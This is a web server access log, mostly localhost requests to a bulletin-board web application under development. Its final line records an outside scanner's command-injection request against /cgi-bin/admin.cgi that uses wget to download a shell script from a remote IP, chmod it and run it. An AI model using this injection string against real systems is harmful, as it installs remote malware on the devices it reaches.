127.0.0.1 - - [17/Jun/2022:15:13:06 +0900] "GET / HTTP/1.1" 404 750
0:0:0:0:0:0:0:1 - - [17/Jun/2022:15:13:06 +0900] "GET /web/ HTTP/1.1" 404 721
0:0:0:0:0:0:0:1 - - [17/Jun/2022:15:13:06 +0900] "GET /favicon.ico HTTP/1.1" 404 761
0:0:0:0:0:0:0:1 - - [17/Jun/2022:15:13:09 +0900] "GET /web/boardList.do HTTP/1.1" 200 985
0:0:0:0:0:0:0:1 - - [17/Jun/2022:15:49:00 +0900] "GET /web/boardList.do HTTP/1.1" 200 1130
0:0:0:0:0:0:0:1 - - [17/Jun/2022:16:49:57 +0900] "GET /web/boardList.do HTTP/1.1" 200 1275
0:0:0:0:0:0:0:1 - - [17/Jun/2022:17:04:53 +0900] "GET /web/boardList.do HTTP/1.1" 200 1298
0:0:0:0:0:0:0:1 - - [17/Jun/2022:17:05:26 +0900] "GET /web/boardList.do HTTP/1.1" 200 1310
0:0:0:0:0:0:0:1 - - [17/Jun/2022:17:05:52 +0900] "GET /web/boardList.do HTTP/1.1" 200 1317
0:0:0:0:0:0:0:1 - - [17/Jun/2022:17:06:31 +0900] "GET /web/boardList.do HTTP/1.1" 200 1317
0:0:0:0:0:0:0:1 - - [17/Jun/2022:17:06:32 +0900] "GET /web/boardList.do HTTP/1.1" 200 1317
0:0:0:0:0:0:0:1 - - [17/Jun/2022:17:06:34 +0900] "GET /web/boardList.do HTTP/1.1" 200 1317
0:0:0:0:0:0:0:1 - - [17/Jun/2022:17:06:35 +0900] "GET /web/boardList.do HTTP/1.1" 200 1317
0:0:0:0:0:0:0:1 - - [17/Jun/2022:17:06:44 +0900] "GET /web/boardList.do HTTP/1.1" 200 1329
0:0:0:0:0:0:0:1 - - [17/Jun/2022:17:13:42 +0900] "GET /web/boardList.do HTTP/1.1" 200 1370
0:0:0:0:0:0:0:1 - - [17/Jun/2022:17:13:43 +0900] "GET /web/boardList.do HTTP/1.1" 200 1370
0:0:0:0:0:0:0:1 - - [17/Jun/2022:17:13:43 +0900] "GET /web/boardList.do HTTP/1.1" 200 1370
0:0:0:0:0:0:0:1 - - [17/Jun/2022:17:13:44 +0900] "GET /web/boardForm.jsp HTTP/1.1" 404 771
0:0:0:0:0:0:0:1 - - [17/Jun/2022:17:20:52 +0900] "GET /web/boardForm.jsp HTTP/1.1" 404 771
0:0:0:0:0:0:0:1 - - [17/Jun/2022:17:20:52 +0900] "GET /web/boardForm.jsp HTTP/1.1" 404 771
0:0:0:0:0:0:0:1 - - [17/Jun/2022:17:20:53 +0900] "GET /web/boardForm.jsp HTTP/1.1" 404 771
0:0:0:0:0:0:0:1 - - [17/Jun/2022:17:20:53 +0900] "GET /web/boardForm.jsp HTTP/1.1" 404 771
0:0:0:0:0:0:0:1 - - [17/Jun/2022:17:20:55 +0900] "GET /web/boardForm.jsp HTTP/1.1" 404 771
0:0:0:0:0:0:0:1 - - [17/Jun/2022:17:20:56 +0900] "GET /web/boardList.do HTTP/1.1" 200 1372
0:0:0:0:0:0:0:1 - - [17/Jun/2022:17:20:57 +0900] "GET /web/boardList.do HTTP/1.1" 200 1372
0:0:0:0:0:0:0:1 - - [17/Jun/2022:17:20:58 +0900] "GET /web/boardInsert.do HTTP/1.1" 404 721
0:0:0:0:0:0:0:1 - - [17/Jun/2022:17:21:01 +0900] "GET /web/boardInsert.do HTTP/1.1" 200 781
0:0:0:0:0:0:0:1 - - [17/Jun/2022:17:21:01 +0900] "GET /web/boardInsert.do HTTP/1.1" 200 781
0:0:0:0:0:0:0:1 - - [17/Jun/2022:17:21:01 +0900] "GET /web/boardInsert.do HTTP/1.1" 200 781
0:0:0:0:0:0:0:1 - - [17/Jun/2022:17:21:02 +0900] "GET /web/boardInsert.do HTTP/1.1" 200 781
0:0:0:0:0:0:0:1 - - [17/Jun/2022:17:38:14 +0900] "GET /web/boardInsert.do HTTP/1.1" 200 1799
0:0:0:0:0:0:0:1 - - [17/Jun/2022:17:40:43 +0900] "GET /web/boardInsert.do HTTP/1.1" 200 1799
0:0:0:0:0:0:0:1 - - [17/Jun/2022:17:47:59 +0900] "GET /web/boardInsert.do HTTP/1.1" 200 1770
0:0:0:0:0:0:0:1 - - [17/Jun/2022:17:48:30 +0900] "GET /web/boardInsert.do HTTP/1.1" 200 1791
0:0:0:0:0:0:0:1 - - [17/Jun/2022:17:49:31 +0900] "GET /web/boardInsert.do HTTP/1.1" 200 1819
0:0:0:0:0:0:0:1 - - [17/Jun/2022:17:49:32 +0900] "GET /web/boardInsert.do HTTP/1.1" 200 1819
0:0:0:0:0:0:0:1 - - [17/Jun/2022:17:49:32 +0900] "GET /web/boardInsert.do HTTP/1.1" 200 1819
0:0:0:0:0:0:0:1 - - [17/Jun/2022:17:49:32 +0900] "GET /web/boardInsert.do HTTP/1.1" 200 1819
64.31.33.2 - - [17/Jun/2022:20:55:50 +0900] "GET /cgi-bin/admin.cgi?Command=sysCommand&Cmd=cd%20/tmp;%20wget%20http://34.125.29.216/bins.sh;%20chmod%20777%20bins.sh;%20sh%20bins.sh;sh%20bins.sh HTTP/1.0" 404 730
